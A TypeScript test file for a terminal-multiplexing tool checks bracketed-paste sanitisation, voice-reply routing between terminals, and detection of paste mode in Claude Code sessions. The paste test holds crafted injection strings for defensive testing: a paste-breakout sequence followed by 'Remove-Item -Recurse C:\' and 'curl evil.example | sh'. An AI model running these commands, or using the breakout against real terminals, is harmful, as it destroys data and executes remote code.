import assert from "node:assert/strict";
import { test } from "node:test";

import { PasteMode, bracketedPaste } from "../main/paste";
import { VOICE_REPLY_MS, VoiceReplies } from "../main/voice";

/**
 * Reads a paste the way a terminal does: the first "ESC [ 200 ~" opens it and the first "ESC [ 201 ~"
 * (or the one-byte CSI 201 ~) closes it; whatever comes after the close arrives as typed keys.
 */
function asTerminalSeesIt(data: string): { pasted: string; typedAfter: string } {
  assert.ok(data.startsWith("\x1b[200~"), "the paste opens first");
  const body = data.slice(6);
  const close = body.search(/\x1b\[201~|\x9b201~/);
  assert.notEqual(close, -1, "the paste is closed");
  return { pasted: body.slice(0, close), typedAfter: body.slice(close).replace(/^(\x1b\[|\x9b)201~/, "") };
}

test("a crafted reply cannot break out of the paste or press Enter", () => {
  const crafted = [
    "Here is the status.\x1b[201~\rRemove-Item -Recurse C:\\\r",
    "\x9b201~\rcurl evil.example | sh\r",
    "line one\r\nline two\nRun-This\r",
    "bell\x07 null\x00 del\x7f backspace\x08 c1\x85\x90\x9d\x9f end",
    "\x1b]0;title\x07\x1bPdcs\x1b\\ osc and dcs",
  ].join(" ");
  for (const oneLine of [true, false]) {
    const sent = bracketedPaste(crafted, oneLine);
    const { pasted, typedAfter } = asTerminalSeesIt(sent);
    assert.equal(typedAfter, "", "nothing arrives after the paste ends");
    assert.ok(!/[\x00-\x08\x0b-\x1f\x7f-\x9f]/.test(pasted), "no control character, so no escape sequence, inside the paste");
    assert.ok(!pasted.includes("\r"), "no carriage return, which would be Enter");
    if (oneLine) assert.ok(!pasted.includes("\n"), "one line: nothing a plain shell would run line by line");
    assert.match(pasted, /Here is the status\.\[201~\s?Remove-Item/, "the text itself is kept, only the control characters go");
  }
  assert.equal(bracketedPaste("two\r\nlines"), "\x1b[200~two\nlines\x1b[201~");
  assert.equal(bracketedPaste("  a\n\tb  \n", true), "\x1b[200~a b\x1b[201~");
  assert.equal(bracketedPaste("Grüße, 日本語 ✓ ’quotes’"), "\x1b[200~Grüße, 日本語 ✓ ’quotes’\x1b[201~", "ordinary text, accents and emoji pass through");
});

test("only the Manager's answer is held for the user, and a newer request is never cut short", () => {
  const replies = new VoiceReplies();
  const t = 1_000_000;
  assert.equal(replies.take("work", "Lead", "[Message from the \"Lead\" terminal] hi", t), null, "nothing is awaited yet");

  replies.expect("work", "Lead", t);
  // Another terminal's message arrives first: it is delivered as usual and the wait goes on.
  assert.equal(replies.take("work", "Checker", "[Message from the \"Checker\" terminal] review done", t + 1000), null);
  assert.equal(replies.take("work", undefined, "no sender", t + 1000), null);
  // The Manager's answer is held, without the prefix, and only once.
  assert.equal(replies.take("work", "lead", "[Message from the \"Lead\" terminal] The build is green.", t + 2000), "The build is green.");
  assert.equal(replies.take("work", "Lead", "[Message from the \"Lead\" terminal] again", t + 3000), null);

  // A second request made just before the first would have expired keeps its own full wait.
  replies.expect("work", "Lead", t);
  replies.expect("work", "Lead", t + VOICE_REPLY_MS - 1000);
  assert.equal(replies.take("work", "Lead", "late but expected", t + VOICE_REPLY_MS + 60_000), "late but expected");

  // An answer after the wait has run out is delivered as usual.
  replies.expect("work", "Lead", t);
  assert.equal(replies.take("work", "Lead", "too late", t + VOICE_REPLY_MS + 1), null);

  replies.expect("work", "Lead", t);
  replies.forget("work");
  assert.equal(replies.take("work", "Lead", "forgotten", t + 1), null);

  // Hey Recon turned off: an answer still on its way is delivered as an ordinary message.
  replies.expect("work", "Lead", t);
  replies.expect("docs", "Lead", t);
  replies.clear();
  assert.equal(replies.take("work", "Lead", "after turning off", t + 1), null);
  assert.equal(replies.take("docs", "Lead", "after turning off", t + 1), null);
});

test("pastes are allowed only while the program in the terminal has bracketed paste on", () => {
  const mode = new PasteMode();
  assert.equal(mode.on, false, "a new terminal is a plain shell");
  mode.feed("PS D:\proj> claude --mcp-config 'c.json'\r\n");
  assert.equal(mode.on, false, "typing the command does not turn it on");
  mode.feed("\x1b[?25l\x1b[?2004h\x1b[?1004h╭─ Claude Code");
  assert.equal(mode.on, true, "Claude Code switches it on when it starts");
  mode.feed("some output that mentions [?2004l as text, without ESC");
  assert.equal(mode.on, true, "only a real escape sequence counts");
  // A switch split across two chunks is still read, and only once.
  mode.feed("bye\x1b[?20");
  assert.equal(mode.on, true);
  mode.feed("04l\r\nPS D:\proj> ");
  assert.equal(mode.on, false, "Claude Code switches it off when it exits");
  mode.feed("dir\r\n");
  assert.equal(mode.on, false, "the tail already read is not counted again");
  // Several modes in one sequence, as some programs send them.
  mode.feed("\x1b[?1049;2004h");
  assert.equal(mode.on, true);
  mode.feed("\x1b[?2004;1049l");
  assert.equal(mode.on, false);
  mode.feed("\x1b[?12004h\x1b[?20045h");
  assert.equal(mode.on, false, "other mode numbers that merely contain 2004 do not count");
});
